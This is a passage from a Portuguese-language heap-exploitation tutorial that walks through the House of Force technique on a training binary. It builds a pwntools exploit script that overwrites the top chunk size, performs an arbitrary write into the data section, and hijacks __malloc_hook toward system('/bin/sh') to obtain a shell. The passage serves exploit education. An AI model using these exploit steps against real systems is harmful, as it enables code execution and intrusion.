  <p>Quando o binário não está <em>linkado</em> a nenhuma GLIBC, significa que utilizará a versão disponibilizada pelo SO, isso indica que se um binário não é vulnerável em uma plataforma, não signigica que não seja vulnerável em outra plataforma.</p>
</blockquote>

<p>Explorando esta vulnerabilidade encontrada, podemos controlar a memória <em>heap</em>, fazendo com que a malloc “ache” que o tamanho da <em>heap</em> tenha o tamanho que quisermos.</p>

<h3 id="contextualizando-a-house-of-force">Contextualizando a House of Force</h3>

<p>Já entendemos que na técnica, podemos sobrescrever o tamanho do <em>top chunk</em>, mas para se ter a noção do que pode ser feito, precisamos entender como o SO mapea a memória durante o processo na perspectiva da malloc. A imagem abaixo, abstrai este processo na mesma ordem que podemos ver no PWNDBG com o comando <code class="language-plaintext highlighter-rouge">vmmap</code>:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_48.png" alt="Processo de mapeamento da memória" /></p>

<p>No bloco “<em>Application</em>”, temos os endereços mais baixos, neste bloco reside o próprio binário em si, e suas seções, como <code class="language-plaintext highlighter-rouge">data section</code> e <code class="language-plaintext highlighter-rouge">code section</code>.</p>

<p>Depois temos o bloco “<em>Heap</em>” que contém os endereços da própria <em>heap</em>.</p>

<p>Em seguida existe um grande <em>gap</em> nos endereços seguido pelo bloco “<em>Libraries</em>”, este bloco contém todas as bibliotecas utilizadas pelo programa, incluindo a proópria GLIBC.</p>

<p>Por ultimo, temos outro grande <em>gap</em> seguido do bloco “<em>Stack</em>” nos endereços mais altos, neste bloco se encontra a pŕopria pilha.</p>

<p>Se preenchermos o <em>top chunbk size field</em> com um valor muito alto, na persepctiva da malloc, este <em>top chunk</em> pode se extender através de todo este <em>gap</em> sobrepondo dados sensíveis nas bibliotecas ou até mesmo nas regiões da pilha.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_49.png" alt="Sobrepondo outras regiões" /></p>

<p>Porém, não podemos esquecer que o <em>data section</em> do binário está no bloco “<em>Application</em>”, que se encontra em endereços mais baixos que a <em>heap</em>. No entanto, se sobrescrevermos o <em>top chunk size field</em> com um valor realmente muito grande, então a malloc entenderia que todos os endereços foram além do espaço do endereço virtual, “dariam a volta” e retornariam para o começo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_50.png" alt="Sobrepondo além dos espaço possível" /></p>

<p>Neste caso, poderiamos fazer outra grande requisição da malloc, que seria possível, graças ao tamanho do <em>top chunk</em>, esta outra requisição também “daria a volta” nos endereços virtuais, porém pararia exatamente no <em>data section</em> do nosso binário.</p>

<p>E esta exploração vai fazer exatamente isso, vamos nos aproveitar da vulnerabilidade de <em>overflow</em> do <em>top chunk size field</em> com o maior valor possível, então, faremos outra grande requisição com o tamanho do intervalo entre o endereço inicial da <em>heap</em> e o endereço do <em>target data</em>, então outra requisição para sobrepor o <em>target</em>, para podemos sobrescrevê-lo.</p>

<p>Para chegar a este objetivo, vamos utilizar alguns caracteres especiais, fazer um pouco de matemática e tornar todo o processo repetível.</p>

<h3 id="exploração">Exploração</h3>

<p>Para seguirmos com a exploração da vulnerabilidade, foi criado um script base em Python chamado <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> que fará a interação com o binário, o script inicial está desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"house_of_force"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span>

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># seleciona a funcao "malloc" e envia o tamanho e os dados
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># calcula a distancia da "volta" entre dois enderecos
</span><span class="k">def</span> <span class="nf">delta</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="mh">0xffffffffffffffff</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span>

<span class="c1"># inicia o script
</span><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1"># tornando o binario interativo
</span><span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Este script, contém a base para iterarmos sobre o binário, ainda vamos adicionar mais aglumas linhas para sobrescrever o <em>target</em>.</p>

<p>Neste experimento, estou utilizando o editor de texto <code class="language-plaintext highlighter-rouge">vim</code> para escrever o script, pois ele permite que executemos o script com argumentos.</p>

<p>Para executermos o script, podemos inserir o comando <code class="language-plaintext highlighter-rouge">:!./%</code> no vim em modo de comando.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_51.png" alt="Executando o script com vim" /></p>

<p>Ao executar o comando, podemos ver que o script foi executado e nos trouxe a resposta do <code class="language-plaintext highlighter-rouge">checksec</code> tanto no binário quanto na sua GLIBC, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_52.png" alt="Script executado" /></p>

<p>Também é possível, através do vim, executar o script e enviá-lo para o GDB, graças a esta função no código:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
</code></pre></div></div>

<p>Para fins te teste, podemos inserir uma linha em nosso script, que utilizará da função <code class="language-plaintext highlighter-rouge">malloc(size, data)</code> para enviar um <em>buffer</em> para a <em>heap</em>, com o comando <code class="language-plaintext highlighter-rouge">malloc(24, b"A" * 24)</code>.<br />
Após adicionarmos esta linha de código, podemos adicionar a execução do script no GDB com o próprio vim, executando o comando <code class="language-plaintext highlighter-rouge">!./% GDB NOASLR</code> (o “<em>NOASLR</em>” desativa a proteção <code class="language-plaintext highlighter-rouge">ASLR</code>).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_53.png" alt="Adicionando a execução no GDB" /></p>

<p>Uma nova janela se abrirá com várias linhas de texto, que podem ser ignoradas, pois são informações que o GDB fornece sobre o script, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_54.png" alt="GDB iniciado pelo script" /></p>

<p>Nesta tela, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">Ctrl + c</code> para pausar o GDB, seguido do comando <code class="language-plaintext highlighter-rouge">vis</code> para verificarmos a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_55.png" alt="User data preenchido" /></p>

<p>Conforme podemos observar, o <em>user data</em> foi preenchido com o buffer de 24 letras “A” conforme esperado. Se inserirmos o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB e voltarmos para a tela do script, veremos que o primeiro dos chunks foi preenchido no programa, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_56.png" alt="Chunk utilizado" /></p>

<p>Conforme já haviamos enumerado a vulnerabilidade, sabemos que, neste momento, se enviarmos mais 8 bytes para o <em>buffer</em>, iremos sobrescrever o <em>top chunk size field</em>. Portanto podemos adicionar mais alguns dados não imprimíveis em nosso <em>buffer</em>.</p>

<p>Como queremos preencher o <em>top chunk size field</em> com o maior valor possível com 8 bytes, podemos enviar <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code> após nosso <em>buffer</em> inicial, para tanto, podemos utilizar a função <code class="language-plaintext highlighter-rouge">p64()</code> da pwntools evitando a necessidade de escrever byte a byte utilizando <em>indianess</em>. Vamos modifcar o teste anterior com a seguinte linha de código:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
</code></pre></div></div>
<p>E executer o script enviando para o GDB, conforme imagem abaixo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_57.png" alt="Sobrescrevendo o top chunk size field" /></p>

<p>Desta vez, quando checamos o <em>chunk</em> com o GDB, podemos ver que o <em>top chunk size field</em> tem o maior tamanho possível, nos possibilitando solicitar um <em>chunk</em> do tamanho que quisermos, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_58.png" alt="Top chunk size field sobrescrito" /></p>

<p>Este é o princípio da técnica <code class="language-plaintext highlighter-rouge">The House of Force</code> em ação.</p>

<p>Agora podemos partir para a segunda fase da exploração.<br />
Vamos solicitar memória suficiente para ultrapassar os intervalos de memória e atingir o conteúdo da função <em>target</em>.</p>

<p>Primeiro, precisamos calcular a distância entre o <em>top chunk</em> e os dados da <em>target</em>. Para isso, podemos utilizar a função <code class="language-plaintext highlighter-rouge">delta(x, y)</code> que foi criada no script.<br />
Esta função leva dois argumentos:</p>

<ol>
  <li>O primeiro é o endereço do <em>top chunk</em>, sabemos sua localização, pois este binário “vaza” o endereço da <em>heap</em>, e nosso script captura este valor na variável <code class="language-plaintext highlighter-rouge">heap</code>. Vamos adicionar ao endereço da <em>heap</em>, mais <code class="language-plaintext highlighter-rouge">0x20</code> bytes que já alocamos, para chegarmos até o endereço do <em>top chunk</em>.</li>
  <li>O segundo é o endereço do <em>data section</em> da função <em>target</em>, onde por padrão a aplicação armazena os “X”. A pwntools nos permite encontrar o endereço dos “simbolos” do binário, invocando o parâmetro “<code class="language-plaintext highlighter-rouge">elf.sym.alvo</code>”, para encontrarmos o endereço da função <em>target</em> podemos utilizar o comando <code class="language-plaintext highlighter-rouge">elf.sym.target</code>. Também vamos subtrair <code class="language-plaintext highlighter-rouge">0x20</code> bytes deste endereço, para pararmos um pouco antes do endereço da <em>data section</em>.</li>
</ol>

<p>Com sestas premissas, podemos adicionar a linha de comando:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">distance</span> <span class="o">=</span> <span class="n">delta</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
</code></pre></div></div>
<p>Agora que sabemos calcular a distância desejada, podemos requisitar um novo <em>chunk</em> e preenchê-lo com algum “lixo” e testar o script. As linhas adicionadas ficaram conforme a imagem abaixo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_59.png" alt="Solicitando o segundo chunk" /></p>

<p>Parando o GDB novamente, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq target-16</code>, para visualizarmos o conteúdo da <em>target</em>, e 16 bytes anteriores a ele.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_60.png" alt="Top chunk escrevendo em data section" /></p>

<p>Conforme podemos observer, temos os bytes <code class="language-plaintext highlighter-rouge">0x58</code> que representam os “X”, porém, alguns bytes antes dele, temos o <em>top chunk size field</em> escrito diretamente no <em>data section</em>  do programa. Podemos confirmar esta informação, com o comando <code class="language-plaintext highlighter-rouge">top_chunk</code> no PWNDBG, que nos mostra o endereço atual da <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_61.png" alt="Endereço e tamanho do top chunk" /></p>

<p>Como o <em>top chunk</em> está logo antes dos “X”, sabemos que o próximo <em>chunk</em> solicitado, irá sobrescrevê-lo, podemos fazer isto manualmente enviando o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB, voltarmos à tela do script e solicitar mais um <em>chunk</em> com a opção um.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_62.png" alt="Solicitando mais um chunk" /></p>

<p>Neste novo <em>chunk</em>, qualquer coisa que enviarmos, vai sobrescrever o <em>data section</em> do binário.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_63.png" alt="Preenchendo o  chunk" /></p>

<p>Como a opção dois do programa, nos mostra o que está armazenado no <em>data section</em> do binário, ele nos retornará algo diferente dos “X” desta vez, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_64.png" alt="Data section sobrescrito" /></p>

<p>Agora podemos adicionar esta chamada em nosso script, e automatizar a exploraçxão. O bloco final do script ficou como abaixo:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span> 
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
 
<span class="c1"># calculando a distancia para o data section da target
</span><span class="n">distance</span> <span class="o">=</span> <span class="n">delta</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
 
<span class="c1"># solicitando um chunk do tamanho da distance e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo o data section
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executá-lo pelo vim, porém sem incorporarmos ao GDB, mostrando que o script funciona em ambiente de produção, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_65.png" alt="Executando o script" /></p>

<p>Ao selecionar a opção dois, vemos nosso <em>buffer</em> ser impresso:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_66.png" alt="Script em funcionamento" /></p>

<blockquote>
  <p>Esta prova de conceito, nos mostra que a vulnerabilidade de <em>heap overflow</em> nos permite escrever arbitrariamente em seções do próprio programa.<br />
Em resumo, esta vulnerabilidade nos permite sobrescrever o <em>top chunk size field</em> com valores imensos, e fazer com que a malloc haja como se o <em>top chunk</em> fosse muito maior do que realmente é, nos permitindo requisitar <em>chunks</em> de tamanhos grandes o suficiente para ultrapassar todos os endereços do programa e nos permitir fazer uma nova requisição para sobrescrever nosso alvo.</p>
</blockquote>

<h2 id="execução-de-código-via-house-of-force">Execução de código via House of Force</h2>

<p>Após o experimento de escrita arbitrária no binário, também podemos executar comandos utilizando a mesma técnica, porém é preciso ter em mente como exatamente fazer isso.</p>

<p>Uma vez que a memória de um programa pode ser sobrescrita, existem várias formas de se fazer isso, tudo depende de quais proteções e técnicas de mitigação o binário possui.</p>

<h3 id="contextualizando-as-possibilidades">Contextualizando as possibilidades</h3>

<p>Olhando do ponto de vista do ASLR, poderiamos nos concentrar na <em>stack</em>, poderiamos escrever funções diretamente na pilha, ou utilizar de <em>pointers</em> para obter execução de código. Porém, a <em>stack</em> é totalmente dependente do estado do programa, neste caso, a pilha é submetida ao ASLR que randomiza os endereços, tornando impossível explorar desta forma.</p>

<p>Poderiamos sobrescrever o próprio binário, como foi feito no experimento anterior, onde adulteramos sua estrutura e escrevemos no <em>data section</em>. Se sobrescrevermos a PLT (<em>Procedure Linkage Table</em>), podemos obter execução de código.</p>

<blockquote>
  <p>PLT é uma lista de apontadores de funções, toda função que um programa chama, reside em uma biblioteca externa, como a própria GLIBC é representada na PLT. O motivo pela qual a PLT é editável durante a execução de um programa é para suportar algo chamado <code class="language-plaintext highlighter-rouge">Lazy Linking</code>, através da qual o endereço de uma função, só é resolvido quando é chamado pela primeira vez.</p>
</blockquote>

<p>Sobrescrever a PLT é uma excelente maneira de controlar o fluxo do programa, por exemplo, este binário utiliza a função <code class="language-plaintext highlighter-rouge">printf()</code> forneceida pela GLIBC, se sobrescrevermos a entrada PLT desta função com o endereço de algum código que desejamos executar, a próxima vez que o programa tentar chamar a função <code class="language-plaintext highlighter-rouge">printf()</code>, nosso código será executado. Porém o <code class="language-plaintext highlighter-rouge">checksec</code> nos mostrou que este binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, isso significa que a PLT é marcada como <code class="language-plaintext highlighter-rouge">read-only</code> após a inicilização do programa.</p>

<p>Outra alternativa, é focar em explorar a própria <em>heap</em>, uma vantagem de fazer desta forma, é que não é necessário ter o vazamento do endereço da <em>heap</em>, pois a distância entre o <em>top chunk</em> e nosso alvo, sempre será relativa. Com esta premissa, poderia haver alguns apontadores de função ou outros dados sensíveis na própria <em>heap</em>. Porém, no caso deste binário, não há nada na <em>heap</em>, além dos nossos próprios dados.</p>

<p>No entando, mesmo com todos estes bloqueios, existe um modo específico do comportamento da <em>heap</em> que nos permite controlar o fluxo do programa, a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<h4 id="malloc-hook">Malloc hook</h4>

<p>Cada função pertencente ao <em>core</em> da malloc, como a <code class="language-plaintext highlighter-rouge">malloc()</code> e a <code class="language-plaintext highlighter-rouge">free()</code> possui um <em>hook</em> associado que assume um <em>function pointer</em> no <em>data section</em> da própria GLIBC.</p>

<p>Em circunstâncias normais, estes <em>hooks</em> podem ser utilizados por desenvolvedores para fazer algumas coisas como implementar seus próprios alocadores de memória ou coletar estatísticas da malloc. Neste caso, vamos utilizá-los para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<h3 id="exploração-1">Exploração</h3>

<p>Para exemplificar a exploração do <em>malloc hook</em>, vamos utilizar uma cópia do script anterior, porém deixando somente a sobrescrita do <em>top chunk size field</em> no bloco de exploração que ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>


<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Desta vez, a distância que queremos cobrir com nossa alocação, é a diferença entre o <em>top chunk</em> e o <em>malloc hook</em>. Vamos utilizar a <em>malloc hook</em>, pois é a única função do <em>core</em> da malloc que podemos chamar de forma confiável neste binário.</p>

<p>Portanto, não precisaremos mais da função <code class="language-plaintext highlighter-rouge">delta()</code>, pois não precisaremos “dar a volta” nos endereços de memória como fizemos anteriormente.</p>

<p>Precisamos encontrar a diferença da distância da função <code class="language-plaintext highlighter-rouge">__malloc_hook</code> encontrada dentro da GLIBC e o nosso <em>top chunk</em> no binário.</p>

<p>Vamos subtrair <code class="language-plaintext highlighter-rouge">0x20</code> bytes do endereço da <em>malloc hook</em>, assim como fizemos anteriormente, para chegarmos alguns bytes antes dela, assim como vamos adicionar <code class="language-plaintext highlighter-rouge">0x20</code> bytes em nossa <em>heap</em>, para compensar o <em>chunk</em> que solicitamos e chegar até o <em>top chunk</em>.</p>

<p>A linha adicionada para calcular a distância, fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com estas linhas de código, podemos executar o script atrelado ao GDB, e verificar seu comportamento. Com o GDB pausado, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq &amp;__malloc_hook-2</code> (utilizamos -2 ao invés de -16, pois o GDB, calcula os endereços de apontadores de forma diferente).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_67.png" alt="Malloc hook" /></p>

<p>Como podemos ver na imagem acima, este <em>qwadword</em> nulo, representa o <em>mallok hook</em>, e como mencionado anteriormente, é um <em>function pointer</em>. Quando está nulo, da forma apresentada na imagem, a função <code class="language-plaintext highlighter-rouge">malloc()</code> funciona de forma normal. Porém, quando não é nulo, a chamada para <code class="language-plaintext highlighter-rouge">malloc()</code> é redirecionada para o endereço escrito na <em>mallok hook</em>.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">top_chunk</code> mostra que nossa função armazenou o <em>top chunk</em> logo acima do <em>malloc hook</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_68.png" alt="Endereço da top chunk" /></p>

<p>Isso significa que a próxima requisição feita a malloc, irá sobrescrever o <em>malloc hook</em>. Podemos comprovar esta teoria, adicionando mais uma linha de código ao script enviando alguns bytes inválidos como <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> e monitorando o comportamento do programa. Nosso bloco de script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executar o programa atralado ao GDB, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">print __malloc_hook</code> ou simplesmente <code class="language-plaintext highlighter-rouge">p __malloc_hook</code> para verificar o conteúdo da <em>malloc hook</em> conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_69.png" alt="Malloc hook sobrescrito" /></p>

<p>Isto comprova que a <em>malloc hook</em> foi sobrescrita, significando que a próxima vez que a função <code class="language-plaintext highlighter-rouge">malloc()</code> for chamada, a execução vai ser redirecionada para o enbdereço não mapeado <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. Podenmos confirmar utilizando o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB e mudando para a janela do script.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_70.png" alt="Programa parado" /></p>

<p>Conforme podemos observar, neste ponto o programa deveria solicitar os dados para preencher o <em>chunk</em>, mas o programa não está mais respondendo. Se olharmos na tela do GDB, veremos que o programa teve um <em>crash</em>, pois tentou executar um endereço não mapeado, que é justamente o que utilizamos, causando um <em>segmentation fault</em>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_71.png" alt="Invalid address" /></p>

<p>Isto significa que sobrescrever o <em>malloc hook</em> com um endereço válido, nos dá controle sobre o fluxo de execução do programa. A pergunta é, o que executar?</p>

<p>A resposta depende do objetivo da exploração, que pode ser um DoS, vazamento de informações sensíveis, entre outros. Mas em nosso caso, vamos obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Uma forma de se obter um shell, é pela função <code class="language-plaintext highlighter-rouge">system()</code> contida na própria GLIBC.</p>

<p>A <code class="language-plaintext highlighter-rouge">man page</code> da função <code class="language-plaintext highlighter-rouge">system()</code>, nos mostra que é uma função simples que leva somente um argumento, uma <em>string</em> que aponta para um comando do <em>shell</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_72.png" alt="Man page system" /></p>

<p>Portanto se redirecionarmos o fluxo de execução para a função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC, e passar o endereço da string “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” como argumento, este processo nos dará uma <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Então, de volta ao script, no lugar dos bytes <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>, vamos passar o endereço da nossa função <code class="language-plaintext highlighter-rouge">system()</code> de dentro da GLIBC. O bloco ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
